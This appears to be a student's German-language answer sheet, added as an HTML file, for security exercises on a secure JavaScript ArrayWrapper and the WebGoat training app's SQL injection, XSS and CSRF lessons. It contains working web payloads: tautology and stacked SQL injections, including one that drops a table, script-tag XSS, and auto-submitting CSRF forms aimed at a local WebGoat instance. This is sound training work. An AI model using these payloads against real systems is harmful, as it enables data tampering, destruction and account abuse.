@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security</title>
+</head>
+
+<style>
+    .question {
+        padding: 10px;
+    }
+
+    .answer {
+        padding: 10px;
+        background-color: lightgrey;
+    }
+</style>
+
+<body>
+    <h1>Security</h1>
+
+    <div id="1">
+        <h2>12.1. Sicherer ArrayWrapper</h2>
+
+        <p class="question">Geben Sie hier Ihr Ursachenanalyse ein:</p>
+
+        <p class="answer">Ursache für diesen Exploit ist, dass die Argumente für die Funktionen des ArrayWrappers nicht
+            validiert werden. Dadurch können Funktionen Elemente des Arrays sein.</p>
+
+        <p class="question">Geben Sie hier Ihr Sicherheitskonzept ein:</p>
+
+        <p class="answer">Eine Möglichkeit ist die Argumente für die Funktionen des ArrayWrappers zunächst zu validieren
+            und zu überprüfen, ob es sich dabei um eine Funktion handelt. Somit kann verhindert werden, dass ein Element
+            des Arrays eine Funktion ist. </p>
+
+        <p class="question">Geben Sie hier Ihren JS-Code eines sicheren ArrayWrappers ein:</p>
+
+        <pre class="answer"><code>function arrayWrapper() {
+    var array;
+    return {
+        get: function (pos) {
+            return array[pos];
+        },
+        set: function (pos, value) {
+            if (isFunction(pos) || isFunction(value)) {
+                console.log('Es wurde ein eventueller Exploit festgestellt');
+                return;
+            } else {
+                array[pos] = value;
+            }
+        },
+        append: function (value) {
+            if (isFunction(value)) {
+                console.log('Es wurde ein eventueller Exploit festgestellt');
+                return;
+            } else {
+                array.push(value);
+            }
+        },
+    }
+    function isFunction(functionToCheck) {
+        return functionToCheck && {}.toString.call(functionToCheck) === '[object Function]';
+    }
+}
+        </code></pre>
+    </div>
+
+    <div id="2">
+        <h2>12.2. WebGoat Injection</h2>
+
+        <p class="answer">2. select department from employees where userid='96134';</p>
+
+        <p class="answer">3. update employees set department='Sales' where userid='89762';</p>
+
+        <p class="answer">4. alter table employees add phone varchar(20);</p>
+
+        <p class="answer">5. grant update on grant_rights to unauthorized_user;</p>
+
+        <p class="answer">9. Smith' or '1'='1'</p>
+
+        <p class="answer">10. LoginCount = 0 and userid = 0 OR 1=1</p>
+
+        <p class="answer">11. EmployeeName = S and AuthenticationTan = ' OR '1'='1</p>
+
+        <p class="answer">12. EmployeeName = S and AuthenticationTan = '; UPDATE employees SET salary=99999 WHERE
+            last_name='Smith</p>
+
+        <p class="answer">Action contains = %'; DROP TABLE access_log;--
+        </p>
+    </div>
+
+    <div id="3">
+        <h2>12.3. WebGoat XSS</h2>
+
+        <p class="answer">2. Ja, die Cookies waren die gleichen in beiden Tabs.</p>
+
+        <p class="answer">7. "
+            <code>&lt;script&gt;alert()&lt;/script&gt;</code>" in das Feld "Enter your credit card number" eintragen.
+        </p>
+
+        <p class="answer">10. start.mvc#test</p>
+
+        <p class="answer">11. Neuen Tab öffnen -> URL
+            http://127.0.0.1:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E
+            eingeben -> Aus der Developer Console die Zahl auslesen -> 447761889</p>
+
+        <p class="answer">12. <br>
+            1. Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser
+            does not know that the script is malicious. <br>
+            2. Solution 3: The data is included in dynamic content that is sent to a web user without being validated
+            for malicious content. <br>
+            3. Solution 1: The script is permanently stored on the server and the victim gets the malicious script when
+            requesting information from the server. <br>
+            4. Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web
+            server is part of the request. <br>
+            5. Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser
+            executes.</p>
+    </div>
+
+    <div id="4">
+        <h2>12.4. WebGoat Cross-Site Request Forgeries</h2>
+
+        <p class="answer">3. HTML Datei mit folgendem Inhalt erstellen: <br>
+        <pre class="answer"><code>&lt;form name="form" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag" method="POST"&gt;&lt;/form&gt;
+&lt;script&gt;document.form.submit();&lt;/script&gt;</code></pre>
+        </p>
+
+        <p class="answer">4. HTMl Datei mit folgendem Inhalt erstellen: <br>
+        <pre class="answer"><code>
+&lt;form name="form" action="http://127.0.0.1:8080/WebGoat/csrf/review" method="POST"&gt;
+    &lt;input type="hidden" name="reviewText" value="Wow this is so cool"&gt;
+    &lt;input type="hidden" name="stars" value="1"&gt;
+    &lt;input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.form.submit();&lt;/script&gt;</code></pre>
+        </p>
+
+        <p class="answer">7. HTMl Datei mit folgendem Inhalt erstellen: <br>
+        <pre class="answer"><code>
+&lt;form name="form" enctype="text/plain" action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message" method="POST"&gt;
+    &lt;input type="hidden"
+        value='{"name": "TestName", "email": "test@test.com", "subject": "service", "message":"Tests"}'&gt;
+&lt;/form&gt;
+&lt;script&gt;document.form.submit();&lt;/script&gt;</code></pre>
+        </p>
+
+        <p class="answer">8. HTMl Datei mit folgendem Inhalt erstellen: <br>
+        <pre class="answer"><code>
+&lt;form name="form" action="http://127.0.0.1:8080/WebGoat/login" method="POST"&gt;
+    &lt;input type="hidden" name="username" value="csrf-test-user"&gt;
+    &lt;input type="hidden" name="password" value="test-user"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.form.submit()&lt;/script&gt;</code></pre>
+        </p>
+    </div>
+</body>
+
+</html>
